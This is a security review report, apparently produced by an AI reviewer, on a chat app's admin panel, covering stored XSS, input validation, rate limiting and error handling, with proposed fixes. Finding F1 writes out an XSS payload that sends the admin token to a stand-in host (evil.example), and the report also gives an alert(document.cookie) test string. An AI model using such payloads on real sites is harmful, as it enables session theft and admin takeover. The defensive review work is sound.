## Findings

### F1. Stored XSS in admin panel via unsanitized Google-OAuth display name → full admin session takeover [severity: high] [kind: vuln]

Evidence:
- `server/chat_api.py:363-365` (`auth_google`) and `server/chat_api.py:432-434` (`auth_google_code`): `name = info.get("name") or email.split("@")[0]` is taken directly from the Google ID token with **no validation, no length cap, no character restriction**, then passed to `_authenticate(...)` → `create_user(db, provider, provider_id, display_name, ...)`.
- `server/chat_db.py:429-470` (`create_user`): stores `display_name` verbatim into the `users` table — no call to any validator.
- Compare with the *only* place display names are actually validated: `server/chat_api.py:690-706` (`_validate_display_name`, regex `_DISPLAYNAME_RE` at `chat_api.py:648-659`) which allows only Latin letters/digits/spaces/`.`/`_`/`-` — but this is exclusively wired to the **`PUT /profile`** edit endpoint (`chat_api.py:727-751`), which display name is optional to ever call (CLAUDE.md "Profile Setup": display name is optional; username/avatar/country are the mandatory fields). A Google account whose real name contains an apostrophe (e.g. "O'Brien") — or an attacker who deliberately sets one — lands in `users.display_name` completely unfiltered and stays there indefinitely unless the user separately edits their display name.
- `server/chat/admin.html`: this unsanitized `display_name` reaches several inline `onclick` handlers whose string arguments are built as `'${esc(x)}'` inside a **double-quoted HTML attribute**:
  - `chat/admin.html:299-300` — `reportAction('${esc(r.id)}','${esc(r.reported_user_id)}','${esc(r.reported_name || ...)}','ban')` (`reported_name` = the *reported user's* display name — directly attacker-influenced via a self-report or any report against them)
  - `chat/admin.html:448` — `adminBan('${esc(u.id)}','${esc(u.display_name||u.username)}')`
  - `chat/admin.html:447` — `adminUnban(...)`
  - `chat/admin.html:484` — `adminDeleteUser(...)`
  - `chat/admin.html:590` — `unban('${esc(b.ban_id)}','${esc(b.display_name || b.username || '')}')`
- `server/static/shared.js:22-24` (`escapeHtml`): encodes `'` → `&#39;` and `"` → `&quot;`. This is correct for HTML **content**/attribute-value contexts, but it is **not sufficient for inline event-handler attributes**: per the HTML parsing algorithm, character references inside an attribute value are decoded *before* the resulting string is compiled as JavaScript for `onclick`/etc. So `&#39;` is turned back into a literal `'` right before the browser hands the string to the JS engine, undoing the escaping and allowing the JS string literal to be closed early.

Attack/failure scenario: a user signs in with Google using a display name such as `x');fetch('https://evil.example/steal?t='+token);// ` (Google places essentially no restriction on the account "name" field, and apostrophes/most punctuation are permitted). No further action is even required beyond an admin viewing that user in the Users tab, unbanning them, or receiving/viewing a report against them (own self-report works) — `esc()` is applied, but because it operates on an attribute that is compiled as JS, the injected `'` closes the string literal early and the remaining attacker text executes as JavaScript in the admin's authenticated browser context. That context has direct access to the module-scope `token` variable (`chat/admin.html:157`) and an ambient session cookie (`httponly=False` at `chat_api.py:276`, required for WS auth) sent via `credentials:'include'`. The injected script can silently exfiltrate the admin token/cookie, or directly invoke the already-defined `api()` helper (e.g. `adminBan`, `adminDeleteUser`, room deletion) — i.e., full compromise of the admin surface from an unprivileged chat account.

Proposed change: never let unvalidated provider-supplied text land in `display_name`. Run OAuth-derived names through the same `_validate_display_name` (or a looser but still XSS-safe sanitizer) before `create_user`, or store the raw provider name separately and derive a safe fallback. Independently (defense-in-depth, since the bypass mechanism is generic): stop building `onclick="fn('${esc(x)}')"` handlers with untrusted string interpolation — use `data-*` attributes plus `addEventListener`, or escape specifically for a single-quoted JS string context (e.g. replace `'` with `\'`/`\u0027` *in addition to* HTML-encoding, or JSON-stringify + further HTML-attribute-encode) so decoding-before-compile can't recreate a raw quote.

### F2. `update_room`'s allowlisted fields (`ttl_minutes`, `position`) accept unvalidated types/ranges, risking a per-room outage [severity: medium] [kind: robustness]

Evidence:
- `server/chat_db.py:732-755` (`update_room`): allowlists the correct column names (so no arbitrary-column-write is possible — this part is fine, see Non-issues), but performs **no type or range check** on the values themselves before writing them into SQLite columns of `INTEGER` affinity.
- `server/chat_api.py:2317-2332` (`admin_update_room`) passes `**body` (raw client JSON) straight through.
- `server/chat_db.py:944-953` (`create_message`): `timedelta(minutes=ttl_minutes)` is evaluated against the room's stored `ttl_minutes` on every message send.

Attack/failure scenario: a PATCH to `/admin/rooms/{id}` with `{"ttl_minutes": "soon"}` (or any non-numeric JSON value) is accepted and written (SQLite's dynamic typing/type-affinity will store text that can't be coerced to an integer as-is). Every subsequent `create_message` call for that room then raises `TypeError` inside `timedelta(minutes=...)`, which is unhandled — breaking message sends for that entire room (500s) until an admin notices and re-PATCHes a valid integer. `position` has the same gap (non-numeric value degrades sort order rather than crashing — lower impact).

Proposed change: validate `ttl_minutes` is `None` or a positive int within a sane bound, and `position` is an int, in `admin_update_room` before calling `update_room`.

### F3. No throttling on `_require_admin` token guesses [severity: medium] [kind: hardening]

Evidence: `server/chat_api.py:245-268` (`_require_admin`) uses `secrets.compare_digest` (good, timing-safe) but there is no counter/lockout/backoff on repeated failed `X-Admin-Token` attempts, unlike the auth endpoints which use `_check_auth_rate` (`chat_api.py:195-208`, 120/5min) specifically because they're reachable pre-auth. `_require_admin` is reachable pre-auth too (it's the gate itself) and currently has zero rate limiting.

Attack/failure scenario: realistic severity depends entirely on `CHAT_ADMIN_TOKEN` entropy (not visible in this review — generated by the maintainer). If the token is short or memorable, an attacker can throw unlimited fast requests at any `/chat/api/admin/*` endpoint (403 responses are cheap, no artificial delay) to brute force it, with no logging/alerting to notice the attempt. Given `.env`-generated secrets are typically high-entropy in this codebase's other secrets (VAPID keys, session tokens), likely low practical risk today, but it's a missing defense-in-depth layer that's cheap to add and is already the pattern used elsewhere in this file.

Proposed change: apply the same per-IP rate limiter (`_check_auth_rate`-style) to failed `_require_admin` token checks.

### F4. Unbounded `limit`/`offset` on `/admin/users` and `/admin/modlog` [severity: low] [kind: robustness]

Evidence: `server/chat_api.py:2058-2065` (`admin_users`) and `2107-2114` (`admin_modlog`) accept `limit`/`offset` as plain `int` query params with no upper bound and no floor check, forwarded straight into `LIMIT ? OFFSET ?` (`chat_db.py:1601-1611`, `1713-1729`). SQLite treats a negative `LIMIT` as "no limit," so `limit=-1` returns the entire `users`/log table in one response regardless of `offset`.

Attack/failure scenario: an admin-authenticated caller (or an attacker who obtained admin access via F1) can force a full-table dump / large in-memory response — a minor amplification/DoS vector layered on top of any other admin-access compromise. Not attacker-reachable without prior admin access.

Proposed change: clamp `limit` to e.g. `1 <= limit <= 200` and `offset >= 0` before querying.

### F5. Malformed JSON body on any admin write endpoint returns an uncaught 500 instead of 400 [severity: low] [kind: robustness]

Evidence: every state-changing admin endpoint calls `await request.json()` with no try/except — e.g. `chat_api.py:1929-1934` (`admin_resolve_report`), `1943-1946` (`admin_ban`), `2028-2031` (`admin_update_settings`), `2135-2139` (`admin_mute_user`), `2170-2174` (`admin_strike_user`), `2279-2283` (`admin_create_room`), `2317-2320` (`admin_update_room`), `2356-2360` (`admin_reorder_rooms`). `Request.json()` raises `json.JSONDecodeError` on invalid/empty bodies; there is no global exception handler registered on the FastAPI app (`server/api.py:518`, `FastAPI(lifespan=lifespan)` — no `debug=True`, no `add_exception_handler`), so Starlette's default handler returns a generic 500 (no stack-trace leak since `debug` is off, just the wrong status code and a less useful client-side error).

Proposed change: wrap `await request.json()` in a `try/except json.JSONDecodeError: raise HTTPException(400, ...)` helper reused across these endpoints (low priority — no information disclosure, just a UX/robustness rough edge).

### F6. Admin-created `room_id`/`name` have no character allowlist (unlike usernames) [severity: low] [kind: hardening]

Evidence: `server/chat_api.py:2283-2287` (`admin_create_room`) derives `room_id = name.lower().replace(" ", "-")` with no regex restriction (contrast with `_USERNAME_RE`/`_DISPLAYNAME_RE` at `chat_api.py:648-662`), and `update_room`'s `name`/`description` fields (`chat_db.py:734-742`) have no length cap either. A room named with an apostrophe reproduces the same `onclick` decode-before-compile issue described in F1 for `deleteRoom('${esc(r.id)}','${esc(r.name)}')` (`chat/admin.html:382`) and `openRoomModal('${esc(r.id)}')` (`chat/admin.html:381`).

Attack/failure scenario: this is admin-self-inflicted only in the current single-admin-token threat model (only an already-authenticated admin can create rooms), so it's not a privilege-escalation path today — flagging as hardening because it's the same fragile pattern as F1 and would become exploitable the moment multiple admins with different trust levels exist (explicitly out of scope for this review, noted per instructions).

Proposed change: same fix as F1 (escape properly for the JS-string context, or stop using inline `onclick` with interpolated strings); optionally also constrain room names to a safe charset.

## Non-issues checked (one line each, so the orchestrator knows what was cleared)
- `update_room(db, room_id, **body)` (`chat_db.py:732-755`) has a hardcoded column allowlist (`name, description, is_moderated, is_read_only, auto_join, allows_media, ttl_minutes, position`) — arbitrary-column write / `is_main`/`event_id`/`type` mutation is **not** possible via this path.
- CSRF: every state-changing `/admin/*` endpoint requires either the `X-Admin-Token` custom header (unsettable by a cross-site form, and blocked pre-flight for cross-site `fetch` since there's no CORS middleware in `server/api.py` permitting foreign origins) or the `chat_session` cookie with `SameSite=Strict` in prod (`chat_api.py:271-281`) and `SameSite=Lax` in dev, which blocks the cookie on cross-site non-GET requests in both modes. No admin `GET` endpoint has side effects (all read-only: reports, settings, stats, users, bans, modlog, rooms).
- Every route under `/chat/api/admin/*` calls `_require_admin(request)` as its first statement — no gap found across all ~20 endpoints (`chat_api.py:1902-2394`).
- `GET /chat/api/admin` (the HTML shell, `chat_api.py:2403-2405`) is intentionally ungated — it serves only the static `admin.html` file (`_admin_html` read once at import time from disk, no dynamic/server-side data embedded), so leaving it ungated does not leak any admin data; all real data access goes through the guarded JSON endpoints.
- Admin token handling: token from `?admin_token=` is stored to `sessionStorage` and the URL is stripped via `history.replaceState` essentially synchronously (`chat/admin.html:156-162`) before any other script runs; it is only ever attached via `X-Admin-Token` to `/chat/api/admin/*` calls (`chat/admin.html:163-174`, `596`), never sent to non-admin endpoints.
- `search_users`/`get_user_admin_detail` (`chat_db.py:1578-1697`) do not expose raw emails, session tokens, or raw push-subscription endpoints — `provider_id` for email accounts is a hash (`hash_email`), consistent with the rest of the codebase's ban-matching design.
- All admin DB handles are opened/closed via `try/finally` on every endpoint; no leaked connections found. `asyncio.create_task(...)` fire-and-forget calls in admin endpoints (`admin_mute_user`, `admin_ban`, `admin_create_room`, etc.) only reference in-memory `manager` state (websocket connections), never the request-scoped `db` handle that gets closed in `finally` — no closed-db-in-background-task race.
- LIKE-query building in `search_users` (`chat_db.py:1592-1598`) is fully parameterized (`?` placeholders) — no SQL injection; a user including literal `%`/`_` in their search query only affects match precision, not security.

## Uncertain / needs orchestrator verification
- F1's core mechanism (HTML entity decoding of an attribute value happening before that value is compiled as JS for an inline event handler) is standard, well-documented HTML/DOM parsing behavior, but I could not execute a browser to produce a live PoC (read-only review, no tools). Recommend a quick manual/Playwright check: create a chat user via the Google-OAuth mock/test path (or directly via `create_user` in a scratch DB) with `display_name = "x');alert(document.cookie);//"`, open the admin Users tab, and confirm script execution on render/ban-click.
- Whether `CHAT_ADMIN_TOKEN` has sufficient entropy to make F3 low-risk in practice is unknown from source alone (it's an environment secret) — worth a one-line confirmation from the maintainer that it's generated with adequate randomness (e.g. `secrets.token_hex(32)` or similar), not a short human-chosen string.
- Cross-lane: the same unescaped-Google-`display_name` root cause (F1) likely also affects `chat.html` message bubble rendering / any other inline-onclick usage outside the admin surface — flagging for whichever reviewer owns `chat.html`/`chat_ws.py`, not analyzed here.
